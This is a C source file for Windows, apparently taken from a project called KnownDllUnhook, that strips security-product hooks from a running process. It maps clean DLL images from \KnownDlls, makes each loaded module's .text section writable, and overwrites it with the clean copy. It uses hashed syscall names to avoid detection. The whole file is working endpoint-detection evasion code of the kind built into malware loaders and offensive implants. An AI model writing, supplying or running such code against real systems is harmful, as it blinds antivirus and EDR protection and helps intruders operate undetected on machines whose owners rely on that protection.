/*
	code from https://github.com/ORCx41/KnownDllUnhook
*/

#include <Windows.h>
#include "Structs.h"
#include "Header.h"
#include "Debug.h"
#include "Syscalls.h"


LPVOID GetDllFromKnownDll(PWSTR DllName) {

	PVOID pModule = NULL;
	HANDLE hSection = INVALID_HANDLE_VALUE;
	UNICODE_STRING UniStr;
	OBJECT_ATTRIBUTES ObjAtr;
	NTSTATUS STATUS;

	WCHAR FullName[MAX_PATH];
	WCHAR Buf[MAX_PATH] = { L'\\', L'K', L'n', L'o', L'w', L'n', L'D', L'l', L'l', L's', L'\\' };

	_strcpyW(FullName, Buf);
	_strcatW(FullName, DllName);
	_RtlInitUnicodeString(&UniStr, FullName);

	InitializeObjectAttributes(
		&ObjAtr,
		&UniStr,
		0x40L,
		NULL,
		NULL
	);


	hSection = NtOpenSection(SECTION_MAP_READ | SECTION_MAP_EXECUTE, &ObjAtr, &STATUS);
	if (!NT_SUCCESS(STATUS) || hSection == INVALID_HANDLE_VALUE) {
#ifdef DEBUG
		PRINTW(L"[!] %s : NtOpenSection Failed : 0x%0.8X (DllUnhooking.c:36) [THAT'S PROB OK]\n", FullName, STATUS);
#endif // DEBUG
		return NULL;
	}


	pModule = NtMapViewOfSection(hSection, NULL, NULL, NULL, PAGE_READONLY, &STATUS);
	if (!NT_SUCCESS(STATUS)) {
#ifdef DEBUG
		PRINTW(L"[!] %s : NtMapViewOfSection Failed : 0x%0.8X (DllUnhooking.c:45)\n", FullName, STATUS);
#endif // DEBUG
		return NULL;
	}


	return pModule;
}



BOOL RefreshAllDlls() {

	// INITIALIZE THE SYSCALLLIB STRUCT

	HashStruct HStrt_ = {
		.NtCreateSection_Hash			= NtCreateSection_StrHashed,
		.NtOpenSection_Hash				= NtOpenSection_StrHashed,
		.NtMapViewOfSection_Hash		= NtMapViewOfSection_StrHashed,
		.NtProtectVirtualMemory_Hash	= NtProtectVirtualMemory_StrHashed,
		.NtUnmapViewOfSection_Hash		= NtUnmapViewOfSection_StrHashed,
		.NtClose_Hash					= NtClose_StrHashed
	};

	if (!InitializeStruct(SEED, &HStrt_))
		return FALSE;

	PPEB pPeb = (PPEB)__readgsqword(0x60);

	if (pPeb == NULL || (pPeb != NULL && pPeb->OSMajorVersion != 0xA)) {
		return FALSE;
	}

	PLIST_ENTRY Head = NULL, Next = NULL;

	NTSTATUS	STATUS = NULL;
	LPVOID		KnownDllDllModule = NULL, CurrentDllModule = NULL;
	PVOID		pLocalTxtAddress = NULL, pRemoteTxtAddress = NULL;
	SIZE_T		sLocalTxtSize = NULL;
	DWORD		dwOldPermission = NULL;


	Head = &pPeb->Ldr->InMemoryOrderModuleList;
	Next = Head->Flink;

	// loop through all dlls:
	while (Next != Head) {

		// getting the dll name:
		PLDR_DATA_TABLE_ENTRY	pLdrData = (PLDR_DATA_TABLE_ENTRY)((PBYTE)Next - offsetof(LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks));
		PUNICODE_STRING			DllName = (PUNICODE_STRING)((PBYTE)&pLdrData->FullDllName + sizeof(UNICODE_STRING));

		// getting it's pointer from \KnownDlls\ in case it returned null, that's ok, cz the dll may not be in KnownDlls after all ...
		KnownDllDllModule = GetDllFromKnownDll(DllName->Buffer);
		CurrentDllModule = (LPVOID)(pLdrData->DllBase);

		// if we had the dll mapped with a valid address from KnownDlls:
		if (KnownDllDllModule != NULL && CurrentDllModule != NULL) {
			// get the dos & nt headers of our local dll
			PIMAGE_DOS_HEADER CurrentDllImgDosHdr = (PIMAGE_DOS_HEADER)CurrentDllModule;
			if (CurrentDllImgDosHdr->e_magic != IMAGE_DOS_SIGNATURE) {
				return FALSE;
			}
			PIMAGE_NT_HEADERS CurrentDllImgNtHdr = (PIMAGE_NT_HEADERS)((PBYTE)CurrentDllModule + CurrentDllImgDosHdr->e_lfanew);
			if (CurrentDllImgNtHdr->Signature != IMAGE_NT_SIGNATURE) {
				return FALSE;
			}
			// get the address of the module's txt section & its size & calculate the knowndll txt section address
			for (int i = 0; i < CurrentDllImgNtHdr->FileHeader.NumberOfSections; i++) {
				PIMAGE_SECTION_HEADER pImgSec = (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(CurrentDllImgNtHdr) + ((DWORD_PTR)IMAGE_SIZEOF_SECTION_HEADER * i));
				if ((*(ULONG*)pImgSec->Name | 0x20202020) == 'xet.') {
					sLocalTxtSize = pImgSec->Misc.VirtualSize;
					pLocalTxtAddress = (PVOID)((ULONG_PTR)CurrentDllModule + pImgSec->VirtualAddress);
					pRemoteTxtAddress = (PVOID)((ULONG_PTR)KnownDllDllModule + pImgSec->VirtualAddress);
				}
			}
			// small check here ...
			if (sLocalTxtSize == NULL || pLocalTxtAddress == NULL || pRemoteTxtAddress == NULL) {
				return FALSE;
			}

			// change mmeory permissions to start patching
			dwOldPermission = NtProtectVirtualMemory((HANDLE)-1, pLocalTxtAddress, sLocalTxtSize, PAGE_EXECUTE_WRITECOPY, &STATUS);
			if (!NT_SUCCESS(STATUS)) {
#ifdef DEBUG
				PRINTW(L"\t[!] NtProtectVirtualMemory [1] Failed : 0x%0.8X (DllUnhooking.c:130)\n", STATUS);
#endif // DEBUG
				return FALSE;
			}

#ifdef DEBUG
			PRINTW(L"\t[i] Replacing .txt of %s ... ", DllName->Buffer);
#endif // DEBUG
			// do the replacement of the .text section
			_memcpy(pLocalTxtAddress, pRemoteTxtAddress, sLocalTxtSize);
#ifdef DEBUG
			PRINTW(L"[+] DONE \n");
#endif // DEBUG

			// re-fix the memory permissions to what it was
			NtProtectVirtualMemory((HANDLE)-1, pLocalTxtAddress, sLocalTxtSize, dwOldPermission, &STATUS);
			if (!NT_SUCCESS(STATUS)) {
#ifdef DEBUG
				PRINTW(L"\t[!] NtProtectVirtualMemory [2] Failed : 0x%0.8X (DllUnhooking.c:148)\n", STATUS);
#endif // DEBUG
				return FALSE;
			}

			// unmap the KnownDlls dll
			NtUnmapViewOfSection((HANDLE)-1, KnownDllDllModule, &STATUS);
			if (!NT_SUCCESS(STATUS)) {
#ifdef DEBUG
				PRINTW(L"\t[!] NtUnmapViewOfSection  Failed : 0x%0.8X (DllUnhooking.c:157)\n", STATUS);
#endif // DEBUG
				return FALSE;
			}

		}

		// continue to the next dll ...
		Next = Next->Flink;

	}


	return TRUE;
}

